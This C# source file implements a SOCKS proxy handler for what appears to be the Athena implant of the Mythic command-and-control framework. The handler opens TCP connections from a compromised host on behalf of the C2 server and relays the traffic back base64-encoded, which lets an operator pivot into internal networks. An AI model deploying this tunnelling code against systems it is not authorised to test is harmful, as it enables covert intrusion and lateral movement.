using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{

    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, SocksConnection> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        public bool running { get; set; }
        static object _connLock = new object();
        static object _msgLock = new object();

        public SocksHandler()
        {
            this.running = false;
            //this.connections = new Dictionary<int, SocksConnection>();
            this.connections = new ConcurrentDictionary<int, SocksConnection>();
        }

        /// <summary>
        /// Start the SOCKS Listener
        /// </summary>
        public async Task<bool> Start()
        {
            this.ct = new CancellationTokenSource();
            //this.connections = new Dictionary<int, SocksConnection>();
            this.connections = new ConcurrentDictionary<int, SocksConnection>();
            this.messagesOut = new ConcurrentBag<SocksMessage>();

            return true;
        }

        /// <summary>
        /// Stops the SOCKS Listener
        /// </summary>
        public async Task<bool> Stop()
        {
            try
            {
                if (!this.running)
                {
                    return true;
                }

                this.running = false;

                if (this.ct is not null)
                {
                    this.ct.Cancel();
                }

                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        public async Task<bool> AddConnection(SocksConnection conn)
        {

            this.connections.GetOrAdd(conn.server_id, conn);
            return true;
        }

        /// <summary>
        /// Remove connection from the tracker dictionary
        /// </summary>
        /// <param name="conn">Connection ID</param>
        public async Task<bool> RemoveConnection(int conn)
        {
            try
            {
                this.connections.Remove(conn, out _);
            }
            catch
            {

            }
            return true;
        }

        /// <summary>
        /// Get messages from the out dictionary to forward to the Mythic server
        /// </summary>
        public List<SocksMessage> GetMessages()
        {
            if (this.messagesOut.Count < 1)
            {
                return new List<SocksMessage>();
            }

            List<SocksMessage> msgOut;

            msgOut = new List<SocksMessage>(this.messagesOut);
            this.messagesOut.Clear();
            msgOut.Reverse();
            return msgOut;
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task HandleMessage(SocksMessage sm)
        {
            if (this.connections.ContainsKey(sm.server_id))
            {
                try
                {
                    if (!string.IsNullOrEmpty(sm.data))
                    {
                        await this.connections[sm.server_id].client.SendAsync(Misc.Base64DecodeToByteArray(sm.data));                            
                    }

                    if (sm.exit)
                    {
                        this.connections[sm.server_id].exited = true;
                        await this.connections[sm.server_id].client.CloseAsync();
                        this.connections[sm.server_id].ct.Cancel();
                        RemoveConnection(sm.server_id);

                    }

                    if (!this.connections[sm.server_id].client.IsConnected)
                    {
                        RemoveConnection(sm.server_id);
                    }

                }
                catch (Exception e)
                {
                }
            }
            else
            {
                await HandleNewConnection(sm);
            }
        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private async Task HandleNewConnection(SocksMessage sm)
        {
            try
            {
                if (String.IsNullOrEmpty(sm.data))
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm);
                SocksConnection sc = new SocksConnection(co);

                sc.client.OnDataReceived += sc.OnReceived;
                sc.client.OnDisconnected += sc.OnDisconnect;

                ConnectResponse cr = new ConnectResponse()
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                };
                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id
                };
                try
                {
                    await sc.client.ConnectAsync(co.ip, co.port);
                    if (!sc.client.IsReceiving)
                    {
                        sc.client.Receive(sc.ct.Token);
                    }

                    if (!sc.client.IsConnected)
                    {
                        cr.status = ConnectResponseStatus.GeneralFailure;
                        smOut.exit = true;
                    }

                    cr.addrtype = co.addressType;

                    //Put our ConnectResponse into the SocksMessage
                    smOut.data = await Misc.Base64Encode(cr.ToByte());

                    AddConnection(sc);
                }
                catch
                {
                    cr.status = ConnectResponseStatus.GeneralFailure;
                    smOut.exit = true;
                }
                //Return message
                ReturnMessage(smOut);
            }
            catch (Exception e)
            {
                ConnectResponse cr = new ConnectResponse()
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                    status = ConnectResponseStatus.GeneralFailure,
                };

                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id,
                    exit = true,
                    data = await Misc.Base64Encode(cr.ToByte())
                };
            }
        }

        /// <summary>
        /// Add a message to the out queue to be returned to the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public async Task ReturnMessage(SocksMessage sm)
        {
            //If a message gets deleted before this gets called, then I throw an error
            this.messagesOut.Add(sm);
        }
    }
}